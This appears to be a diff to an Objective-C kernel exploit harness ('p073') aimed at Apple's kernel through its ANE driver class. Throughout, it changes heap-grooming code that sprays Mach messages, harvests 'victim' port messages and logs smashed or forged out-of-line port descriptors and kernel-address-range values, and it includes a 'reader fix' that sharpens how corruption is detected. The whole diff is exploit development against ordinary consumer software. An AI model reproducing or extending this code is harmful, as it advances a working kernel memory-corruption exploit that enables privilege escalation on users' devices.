@@ -68,7 +68,7 @@
    tunes both without a rebuild: prefill = live portkind count placed
    fire-1 hop; burst = the fresh-small census load count (0 for the pure
    conversion round). */
-#define P073_BUILD @"p073-second-table-v10-conversion-dial"
+#define P073_BUILD @"p073-second-table-v11-reader-fix"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -183,7 +183,7 @@ static uint32_t g_p073_oolHits;
    the prefill for the crossing element) */
 static uint32_t g_p073_burstN   = P073_SMALL_BURST;
 static uint32_t g_p073_prefillN = 2u;
-static uint32_t g_p073_prefillCap = 64u;   /* hard bound; buffer follows calloc size */
+static uint32_t g_p073_prefillCap = 128u;  /* dial room: prefill=16 covers the pop neighborhood */
 
 /* v9: inspect one received descriptor for the OOL conversion door.
    Layout law (v7d, measured): {name u32 @0, pad u32 @4, type u16 @8,
@@ -427,7 +427,7 @@ static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
 
 /* recv one port-kind victim; -1 = processed with evidence (smash seen),
     0 = gone/timeout, 1 = clean */
-static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
+static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut, const char *label) {
     uint8_t rbuf[P073_MSG_SIZE + 0x300];
     memset(rbuf, 0, sizeof(rbuf));
     mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
@@ -437,8 +437,8 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
     if (mr != MACH_MSG_SUCCESS) {
         /* kernel choked on the received complex message — if this victim was
            fill-adjacent, the smashed descriptor region is the witness. */
-        p073_log(@"  [!] PORTKIND sentPost[%u] recv mr=0x%x (desc processing rejected/errored)",
-                 v->index, mr);
+        p073_log(@"  [!] PORTKIND %s[%u] recv mr=0x%x (desc processing rejected/errored)",
+                 label ?: @"?", v->index, mr);
         p073_log(@"      head bytes at +%018zx: (hexdump below)", P073_PORT_BODY_OFF);
         uint8_t *rb = (uint8_t *)h;
         for (uint32_t row = 0; row < 6; row++) {
@@ -484,9 +484,9 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
                || (name >= P073_KVA_MIN && name < P073_KVA_MAX);
         if (sm) {
             forge++;
-            p073_log(@"  [+] DESC SMASHED sentPost[%u] desc[%u] name=0x%08x pad=0x%08x "
+            p073_log(@"  [+] DESC SMASHED %s[%u] desc[%u] name=0x%08x pad=0x%08x "
                      @"type=0x%04x disp=0x%04x (fill record: sid=%u flags=0x%08x tail=0x%04x%04x)",
-                     v->index, i, name, padw, dtype, ddisp,
+                     label ?: @"?", v->index, i, name, padw, dtype, ddisp,
                      name, padw, ddisp, dtype);
             /* v9: a fill-tail (0x1000000001) class landing = type 0x0001 = OOL —
                the conversion door read. Probe the address the kernel may have
@@ -505,8 +505,10 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
     return 1;
 }
 
-/* recv one simple extra; 1 = clean marker, 0 = gone/timeout, -1 = MUTATED */
-static int p073_harvest_one(p073_held_t *v, const char *label) {
+/* recv one simple extra; 1 = clean marker, 0 = gone/timeout, -1 = MUTATED.
+   v11: unused after the sentPre reader fix (kept for the OOL-harness
+   round-trip work). */
+__attribute__((unused)) static int p073_harvest_one(p073_held_t *v, const char *label) {
     uint8_t rbuf[P073_MSG_SIZE + 64];
     memset(rbuf, 0, sizeof(rbuf));
     mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
@@ -1054,26 +1056,32 @@ static NSURL *p073_model_url(NSString *name) {
     uint32_t touched = p073_surface_scan(surfs, nSurf);
     p073_log(@"[D1] surface scan: %u touched of %u", touched, nSurf);
 
-    /* ---- D2 harvest: sentPre payload sentinels + positioned prefill + sentPost PORT-KIND door ---- */
+    /* ---- D2 harvest: sentPre PORTKIND door + positioned prefill + sentPost ---- */
     g_p073_oolHits = 0;
     uint32_t mut = 0, clean = 0, descForged = 0;
+    /* v11 reader fix: sentPre are PORTKIND msgs (v7f) — the old simple
+       payload reader misread the kernel's desc-translation words as "FILL
+       HIT" (the 15:01 run's 64 misclassified entries; no fill-law words in
+       any dump). The desc reader is the correct decode; simple fallbacks
+       return clean harmlessly (no COMPLEX bit → 1). */
     for (uint32_t i = 0; i < nPre; i++) {
         if (!sentPre[i].alive) continue;
-        int r = p073_harvest_one(&sentPre[i], "sentPre");
-        if (r < 0) mut++; else if (r > 0) clean++;
+        uint32_t forged = 0;
+        int r = p073_harvest_portkind(&sentPre[i], &forged, "sentPre");
+        if (r < 0) { mut++; descForged += forged; } else if (r > 0) clean++;
     }
     /* v9: the positioned groom pair — decoded FIRST (they are the record-192
        crossing candidates; 264 law says the landing starts at their off:0) */
     for (uint32_t i = 0; i < nFill; i++) {
         if (!fill[i].alive) continue;
         uint32_t forged = 0;
-        int r = p073_harvest_portkind(&fill[i], &forged);
+        int r = p073_harvest_portkind(&fill[i], &forged, "fillv9");
         if (r < 0) { mut++; descForged += forged; } else if (r > 0) clean++;
     }
     for (uint32_t i = 0; i < nPost; i++) {
         if (!sentPost[i].alive) continue;
         uint32_t forged = 0;
-        int r = p073_harvest_portkind(&sentPost[i], &forged);
+        int r = p073_harvest_portkind(&sentPost[i], &forged, "sentPost");
         if (r < 0) { mut++; descForged += forged; } else if (r > 0) clean++;
     }
     p073_log(@"[D2] sentinel harvest: mutated=%u clean=%u descForged=%u", mut, clean, descForged);
